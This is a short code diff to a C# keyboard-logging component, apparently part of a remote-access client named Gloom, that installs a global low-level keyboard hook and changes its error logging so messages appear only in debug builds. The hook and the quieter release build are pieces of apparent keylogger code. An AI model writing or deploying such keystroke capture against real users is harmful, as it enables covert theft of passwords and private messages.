@@ -1,5 +1,4 @@
-﻿using Serilog;
-using System.Diagnostics;
+﻿using System.Diagnostics;
 
 namespace Gloom.Client.Features.Logger.InputLog
 {
@@ -25,8 +24,10 @@ namespace Gloom.Client.Features.Logger.InputLog
 			using var module = process.MainModule;
 			if (module != null)
 				HookHandle = User32.SetWindowsHookEx(User32.WH_KEYBOARD_LL, MyCallback, module.BaseAddress, 0);
+#if DEBUG
 			else
-				Log.Warning("Hook not installed: Main module of current process unavailable.");
+				Console.WriteLine("Keyboard hook not installed: Main module of current process unavailable.");
+#endif
 		}
 
 		private static IntPtr KeyboardHookProc(int nCode, IntPtr wParam, ref User32.KBDLLHOOKSTRUCT lParam)
@@ -41,7 +42,9 @@ namespace Gloom.Client.Features.Logger.InputLog
 					}
 					catch (Exception e)
 					{
-						Log.Fatal(e, "Exception on keyboard hook event.");
+#if DEBUG
+						Console.WriteLine("Exception on keyboard hook event: " + e);
+#endif
 					} // trunc
 
 					// Activate modifier
